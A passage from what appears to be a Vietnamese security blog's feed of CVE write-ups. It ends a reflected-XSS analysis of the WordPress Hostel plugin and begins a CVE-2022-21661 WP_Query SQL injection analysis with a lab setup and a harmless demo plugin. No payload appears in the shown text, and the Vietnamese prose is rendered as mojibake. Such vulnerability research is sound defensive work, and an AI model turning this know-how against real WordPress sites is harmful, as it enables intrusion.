href=&#34;https://bughunters.google.com/learn/invalid-reports/web-platform/xss/6619189462433792/xss-in-sandbox-domains&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Sandbox Domain&lt;/a&gt; khi·∫øn cho t√°c ƒë·ªông c·ªßa &lt;code&gt;payload&lt;/code&gt; b·ªã xem nh·∫π ho·∫∑c kh√¥ng c√≥.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;strong&gt;K·∫øt qu·∫£&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-02-cve-2025-6234/xss_success.png&#34;&#xA;    alt=&#34;XSS ph·∫£n chi·∫øu th√†nh c√¥ng&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;XSS ph·∫£n chi·∫øu th√†nh c√¥ng&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng &lt;strong&gt;CVE-2025-6234&lt;/strong&gt; trong plugin &lt;strong&gt;WordPress Hostel&lt;/strong&gt; b·∫Øt ngu·ªìn t·ª´ vi·ªác kh√¥ng x·ª≠ l√Ω ƒë√∫ng d·ªØ li·ªáu ƒë·∫ßu v√†o &lt;code&gt;($_GET[&#39;ob&#39;])&lt;/code&gt; tr∆∞·ªõc khi ph·∫£n h·ªìi l·∫°i tr√™n giao di·ªán. ƒêi·ªÅu n√†y m·ªü ra kh·∫£ nƒÉng cho attacker ch√®n m√£ ƒë·ªôc &lt;strong&gt;Reflected XSS&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;B·∫£n v√° ƒë√£ kh·∫Øc ph·ª•c b·∫±ng c√°ch s·ª≠ d·ª•ng h√†m &lt;code&gt;esc_attr()&lt;/code&gt; ƒë·ªÉ escape d·ªØ li·ªáu tr∆∞·ªõc khi in ra HTML, ƒë·∫£m b·∫£o r·∫±ng c√°c gi√° tr·ªã kh√¥ng tin c·∫≠y kh√¥ng th·ªÉ ch√®n script ƒë·ªôc h·∫°i.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Key takeaways&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Lu√¥n &lt;strong&gt;sanitize&lt;/strong&gt; d·ªØ li·ªáu ƒë·∫ßu v√†o v√† &lt;strong&gt;escape&lt;/strong&gt; d·ªØ li·ªáu ƒë·∫ßu ra theo ng·ªØ c·∫£nh (context).&lt;/li&gt;&#xA;&lt;li&gt;V·ªõi WordPress, t·∫≠n d·ª•ng c√°c h√†m built-in nh∆∞ &lt;code&gt;sanitize_text_field()&lt;/code&gt;, &lt;code&gt;esc_attr()&lt;/code&gt;, &lt;code&gt;esc_html()&lt;/code&gt;, &lt;code&gt;wp_kses()&lt;/code&gt;&amp;hellip; ƒë·ªÉ gi·∫£m thi·ªÉu r·ªßi ro b·∫£o m·∫≠t.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://portswigger.net/web-security/cross-site-scripting/cheat-sheet&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;XSSCross-site scripting (XSS) cheat sheet - PortSwigger&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/hostel/vulnerability/wordpress-hostel-plugin-1-1-5-8-reflected-xss-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Hostel Plugin &amp;lt; 1.1.5.8 is vulnerable to Cross Site Scripting (XSS) - patchstack&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2022-21661 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-10-01-cve-2022-21661/</link>
      <pubDate>Wed, 01 Oct 2025 12:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-10-01-cve-2022-21661/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-10-01-cve-2022-21661/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;p&gt;Do vi·ªác l√†m s·∫°ch d·ªØ li·ªáu (&lt;strong&gt;sanitization&lt;/strong&gt;) kh√¥ng ƒë√∫ng c√°ch trong &lt;code&gt;WP_Query&lt;/code&gt;, c√≥ nh·ªØng tr∆∞·ªùng h·ª£p c√≥ th·ªÉ x·∫£y ra &lt;strong&gt;SQL Injection&lt;/strong&gt; th√¥ng qua c√°c &lt;strong&gt;plugin&lt;/strong&gt; ho·∫∑c &lt;strong&gt;theme&lt;/strong&gt; s·ª≠ d·ª•ng n√≥ theo m·ªôt c√°ch nh·∫•t ƒë·ªãnh. L·ªó h·ªïng n√†y ƒë√£ ƒë∆∞·ª£c v√° trong WordPress phi√™n b·∫£n &lt;strong&gt;5.8.3&lt;/strong&gt;. C√°c phi√™n b·∫£n c≈© h∆°n b·ªã ·∫£nh h∆∞·ªüng c≈©ng ƒë√£ ƒë∆∞·ª£c s·ª≠a th√¥ng qua b·∫£n ph√°t h√†nh b·∫£o m·∫≠t, quay ng∆∞·ª£c l·∫°i ƒë·∫øn t·∫≠n phi√™n b·∫£n &lt;strong&gt;3.7.37&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2022-21661&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2022-21661&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: SQL Injection&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &lt;code&gt;3.7.37 ‚â§ version &amp;lt; 5.8.3&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;:  High (8.0)&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;WordPress&lt;/strong&gt;: v5.8.2(vul)&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;setup&#34;&gt;&lt;span&gt;Setup&lt;/span&gt;&#xA;  &lt;a href=&#34;#setup&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;required-php-version&#34;&gt;&lt;span&gt;Required PHP Version&lt;/span&gt;&#xA;  &lt;a href=&#34;#required-php-version&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;WordPress ƒë∆∞·ª£c x√¢y d·ª±ng ho√†n to√†n b·∫±ng PHP, v√¨ v·∫≠y phi√™n b·∫£n PHP tr√™n m√°y ch·ªß c√≥ ·∫£nh h∆∞·ªüng tr·ª±c ti·∫øp ƒë·∫øn kh·∫£ nƒÉng ho·∫°t ƒë·ªông c·ªßa WordPress:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;M·ªói phi√™n b·∫£n PHP ƒë·ªÅu b·ªï sung t√≠nh nƒÉng m·ªõi v√† lo·∫°i b·ªè d·∫ßn c√°c h√†m/c√∫ ph√°p l·ªói th·ªùi.&lt;/li&gt;&#xA;&lt;li&gt;N·∫øu WordPress d√πng t√≠nh nƒÉng m·ªõi nh∆∞ng PHP tr√™n server qu√° c≈© =&amp;gt; s·∫Ω ph√°t sinh l·ªói c√∫ ph√°p (syntax error) ho·∫∑c kh√¥ng ch·∫°y ƒë∆∞·ª£c.&lt;/li&gt;&#xA;&lt;li&gt;Ng∆∞·ª£c l·∫°i, n·∫øu PHP qu√° m·ªõi, m·ªôt s·ªë h√†m c≈© m√† WordPress v·∫´n c√≤n s·ª≠ d·ª•ng c√≥ th·ªÉ ƒë√£ deprecated ho·∫∑c b·ªã lo·∫°i b·ªè ho√†n to√†n, g√¢y l·ªói khi ch·∫°y.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;üëâ Do ƒë√≥, c·∫ßn l·ª±a ch·ªçn phi√™n b·∫£n PHP t∆∞∆°ng th√≠ch v·ªõi phi√™n b·∫£n WordPress. Trong ph√¢n t√≠ch n√†y, ta s·ª≠ d·ª•ng PHP &lt;strong&gt;7.4&lt;/strong&gt; ƒë·ªÉ c√†i ƒë·∫∑t WordPress &lt;strong&gt;5.8.2&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;vscode-extensions&#34;&gt;&lt;span&gt;VSCode Extensions&lt;/span&gt;&#xA;  &lt;a href=&#34;#vscode-extensions&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;WordPress c√≥ m√£ ngu·ªìn ph·ª©c t·∫°p, n√™n vi·ªác ƒë·ªçc t·ª´ng d√≤ng code th·ªß c√¥ng l√† kh√¥ng kh·∫£ thi. ƒê·ªÉ h·ªó tr·ª£ qu√° tr√¨nh &lt;strong&gt;debug&lt;/strong&gt; v√† &lt;strong&gt;truy v·∫øt&lt;/strong&gt;, ta c·∫ßn c√†i ƒë·∫∑t th√™m hai extension sau trong VS Code:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;PHP Extension Pack&lt;/strong&gt; =&amp;gt; t√¨m b·∫±ng t·ª´ kh√≥a: &lt;code&gt;xdebug.php-pack&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;PHP Tools&lt;/strong&gt; for VS Code =&amp;gt; t√¨m b·∫±ng t·ª´ kh√≥a: &lt;code&gt;devsense.phptools-vscode&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;custom-plugin&#34;&gt;&lt;span&gt;Custom Plugin&lt;/span&gt;&#xA;  &lt;a href=&#34;#custom-plugin&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;V√¨ l·ªó h·ªïng SQLi n√†y ·∫£nh h∆∞·ªüng ƒë·∫øn &lt;strong&gt;WordPress Core&lt;/strong&gt;, nh∆∞ng ch·ªâ c√≥ th·ªÉ khai th√°c gi√°n ti·∫øp th√¥ng qua &lt;strong&gt;plugin&lt;/strong&gt; ho·∫∑c &lt;strong&gt;theme&lt;/strong&gt; s·ª≠ d·ª•ng &lt;code&gt;WP_Query&lt;/code&gt;, n√™n ta c·∫ßn th√¥ng qua m·ªôt &lt;strong&gt;plugin&lt;/strong&gt; ho·∫∑c &lt;strong&gt;theme&lt;/strong&gt; ƒë·ªÉ t·∫°o t∆∞∆°ng t√°c v·ªõi &lt;strong&gt;WP_Query&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Ta x√¢y d·ª±ng &lt;strong&gt;plugin&lt;/strong&gt; s·ª≠ d·ª•ng &lt;code&gt;WP_Query&lt;/code&gt;, hi·ªÉn th·ªã query ƒë∆∞·ª£c th·ª±c thi th√¥ng qua &lt;code&gt;WP_Query::request&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;?php&#xA;/**&#xA; * Plugin Name: Demo WP_Query&#xA; * Description: Plugin demo WP_Query&#xA; * Version: 1.0&#xA; * Author: w41bu1&#xA; */&#xA;&#xA;if (!defined(&amp;#39;ABSPATH&amp;#39;))&#xA;    exit;&#xA;&#xA;function da_show_posts()&#xA;{&#xA;    $args = [&#xA;        &amp;#39;post_type&amp;#39; =&amp;gt; &amp;#39;post&amp;#39;,&#xA;        &amp;#39;tax_query&amp;#39; =&amp;gt; [&#xA;            [&#xA;                &amp;#39;taxonomy&amp;#39; =&amp;gt; &amp;#39;category&amp;#39;,&#xA;                &amp;#39;field&amp;#39; =&amp;gt; &amp;#39;term_taxonomy_id&amp;#39;,&#xA;                &amp;#39;terms&amp;#39; =&amp;gt; [1,2,3],&#xA;                &amp;#39;operator&amp;#39; =&amp;gt; &amp;#39;IN&amp;#39;,&#xA;            ],&#xA;        ],&#xA;    ];&#xA;&#xA;    $query = new WP_Query($args);&#xA;&#xA;    ob_start();&#xA;&#xA;    echo &amp;#39;&amp;lt;h3&amp;gt;Demo WP_Query&amp;lt;/h3&amp;gt;&amp;#39;;&#xA;    echo &amp;#39;&amp;lt;pre style=&amp;#34;background:#f0f0f0; padding:15px; width:100%; white-space:pre-wrap; word-wrap:break-word; overflow:auto;&amp;#34;&amp;gt;&amp;#39;;&#xA;    echo &amp;#34;SQL query generated by WP_Query:\n\n&amp;#34;;&#xA;    echo esc_html($query-&amp;gt;request); // Display executed query &#xA;    echo &amp;#39;&amp;lt;/pre&amp;gt;&amp;#39;;&#xA;&#xA;    if ($query-&amp;gt;have_posts()) {&#xA;        echo &amp;#39;&amp;lt;ul&amp;gt;&amp;#39;;&#xA;        while ($query-&amp;gt;have_posts()) {&#xA;            $query-&amp;gt;the_post();&#xA;            echo &amp;#39;&amp;lt;li&amp;gt;&amp;#39; . get_the_title() . &amp;#39; (&amp;#39; . get_the_ID() . &amp;#39;)&amp;lt;/li&amp;gt;&amp;#39;;&#xA;        }&#xA;        echo &amp;#39;&amp;lt;/ul&amp;gt;&amp;#39;;&#xA;    } else {&#xA;        echo &amp;#39;&amp;lt;p&amp;gt;No posts found.&amp;lt;/p&amp;gt;&amp;#39;;&#xA;    }&#xA;&#xA;    wp_reset_postdata();&#xA;    return ob_get_clean();&#xA;}&#xA;add_shortcode(&amp;#39;demo_wp_query&amp;#39;, &amp;#39;da_show_posts&amp;#39;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;a href=&#34;https://developer.wordpress.org/reference/classes/wp_query/#taxonomy-parameters&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Taxonomy parameters&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;T·∫°o page m·ªõi v·ªõi &lt;code&gt;&amp;lt;page-title&amp;gt;&lt;/code&gt; c√≥ &lt;strong&gt;shortcode&lt;/strong&gt; :&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;[demo_wp_query]&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;üëâ Truy v·∫•n s·∫Ω ƒë∆∞·ª£c hi·ªÉn th·ªã khi truy c·∫≠p &lt;code&gt;http://localhost/&amp;lt;page-title&amp;gt;&lt;/code&gt;&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-01-cve-2022-21661/demo_page.png&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;h4&gt;Trang demo hi·ªÉn th·ªã k·∫øt qu·∫£ WP_Query&lt;/h4&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;wpdb&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;L√† l·ªõp PHP c·ªët l√µi c·ªßa WordPress d√πng ƒë·ªÉ thao t√°c tr·ª±c ti·∫øp v·ªõi MySQL.&lt;/li&gt;&#xA;&lt;li&gt;Cho ph√©p l·∫≠p tr√¨nh vi√™n &lt;strong&gt;vi·∫øt v√† th·ª±c thi c√¢u SQL th√¥&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;strong&gt;WP_Query&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;L√† m·ªôt l·ªõp tr·ª´u t∆∞·ª£ng h√≥a gi√∫p l·∫•y d·ªØ li·ªáu b√†i vi·∫øt (post) t·ª´ database m√† &lt;strong&gt;kh√¥ng c·∫ßn vi·∫øt SQL tr·ª±c ti·∫øp&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;L·∫≠p tr√¨nh vi√™n ch·ªâ c·∫ßn truy·ªÅn v√†o m·∫£ng tham s·ªë (args), WordPress s·∫Ω t·ª± ƒë·ªông d·ª±ng c√¢u SQL ph√π h·ª£p.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;strong&gt;M·ªëi quan h·ªá&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;WP_Query kh√¥ng tr·ª±c ti·∫øp truy v·∫•n MySQL.&lt;/li&gt;&#xA;&lt;li&gt;Thay v√†o ƒë√≥, n√≥ x√¢y d·ª±ng c√¢u SQL d·ª±a tr√™n args, √°p d·ª•ng c√°c b∆∞·ªõc &lt;strong&gt;ki·ªÉm tra&lt;/strong&gt;/&lt;strong&gt;validate&lt;/strong&gt;, r·ªìi g·ªçi &lt;code&gt;$wpdb&lt;/code&gt; ƒë·ªÉ th·ª±c thi.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch Diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;WordPress l√† m·ªôt d·ª± √°n &lt;strong&gt;m√£ ngu·ªìn m·ªü&lt;/strong&gt; v·ªõi kho l∆∞u tr·ªØ ƒë∆∞·ª£c c√¥ng khai tr√™n &lt;strong&gt;GitHub&lt;/strong&gt;. V√¨ v·∫≠y, m·ªçi b·∫£n v√° ƒë·ªÅu ƒë∆∞·ª£c commit 